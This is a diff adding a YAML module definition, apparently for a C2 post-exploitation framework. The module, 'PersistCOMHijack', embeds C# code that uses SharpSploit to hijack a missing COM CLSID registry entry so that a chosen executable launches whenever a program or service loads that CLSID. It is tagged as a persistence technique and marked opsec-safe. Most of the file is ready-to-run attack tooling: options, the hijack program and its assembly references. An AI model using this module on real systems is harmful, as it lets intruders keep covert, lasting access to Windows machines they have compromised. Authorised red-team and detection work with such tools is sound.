@@ -1,0 +1,130 @@
+name: PersistCOMHijack
+authors:
+  - name: Anthony Rose
+    handle: Cx01N
+    link: https://twitter.com/Cx01N_
+description: |
+  Hijacks a CLSID key to execute a payload for persistence. Requires that
+  an installed program or service attempts to load a missing CLSID. If successful
+  the executable is launched at the privilege level of the targeted program or service.
+software: ''
+tactics: [TA0003]
+techniques: [T1546.015]
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: csharp
+min_language_version: ''
+options:
+  - name: CLSID
+    description: Missing CLSID to abuse.
+    required: true
+    value: ''
+    strict: false
+    suggested_values: []
+  - name: ExecutablePath
+    description: Path to the executable path.
+    required: true
+    value: ''
+    strict: false
+    suggested_values: []
+csharp:
+  UnsafeCompile: false
+  CompatibleDotNetVersions:
+    - Net35
+    - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using SharpSploit.Persistence;
+
+    public static class Program
+    {
+        public static void Main(string[] args)
+        {
+            string clsid = args.Length > 0 ? args[0] : "";
+            string executablePath = args.Length > 1 ? args[1] : "";
+
+            string result = HijackComClsid(clsid, executablePath);
+            Console.WriteLine(result);
+        }
+
+        public static string HijackComClsid(string clsid, string executablePath)
+        {
+            using (StringWriter stringWriter = new StringWriter())
+            {
+                try
+                {
+                    if (COM.HijackCLSID(clsid, executablePath))
+                    {
+                        stringWriter.WriteLine("COM hijack succeeded for CLSID: " + clsid + " with ExecutablePath: " + executablePath);
+                    }
+                    else
+                    {
+                        stringWriter.WriteLine("COM hijack failed for CLSID: " + clsid + " with ExecutablePath: " + executablePath);
+                    }
+                }
+                catch (Exception e)
+                {
+                    stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
+                }
+
+                return stringWriter.ToString();
+            }
+        }
+    }
+  ReferenceSourceLibraries:
+    - Name: SharpSploit
+      Description: SharpSploit is a library for C# post-exploitation modules.
+      Location: SharpSploit\SharpSploit\
+      Language: CSharp
+      CompatibleDotNetVersions:
+        - Net35
+        - Net40
+      ReferenceAssemblies:
+        - Name: System.Management.Automation.dll
+          Location: net35\System.Management.Automation.dll
+          DotNetVersion: Net35
+        - Name: System.Management.dll
+          Location: net40\System.Management.dll
+          DotNetVersion: Net40
+        - Name: System.Management.Automation.dll
+          Location: net40\System.Management.Automation.dll
+          DotNetVersion: Net40
+        - Name: System.IdentityModel.dll
+          Location: net40\System.IdentityModel.dll
+          DotNetVersion: Net40
+        - Name: System.dll
+          Location: net40\System.dll
+          DotNetVersion: Net40
+        - Name: System.DirectoryServices.dll
+          Location: net40\System.DirectoryServices.dll
+          DotNetVersion: Net40
+        - Name: System.Core.dll
+          Location: net40\System.Core.dll
+          DotNetVersion: Net40
+        - Name: mscorlib.dll
+          Location: net40\mscorlib.dll
+          DotNetVersion: Net40
+        - Name: System.Management.dll
+          Location: net35\System.Management.dll
+          DotNetVersion: Net35
+        - Name: mscorlib.dll
+          Location: net35\mscorlib.dll
+          DotNetVersion: Net35
+        - Name: System.Core.dll
+          Location: net35\System.Core.dll
+          DotNetVersion: Net35
+        - Name: System.DirectoryServices.dll
+          Location: net35\System.DirectoryServices.dll
+          DotNetVersion: Net35
+        - Name: System.dll
+          Location: net35\System.dll
+          DotNetVersion: Net35
+        - Name: System.IdentityModel.dll
+          Location: net35\System.IdentityModel.dll
+          DotNetVersion: Net35
+      EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
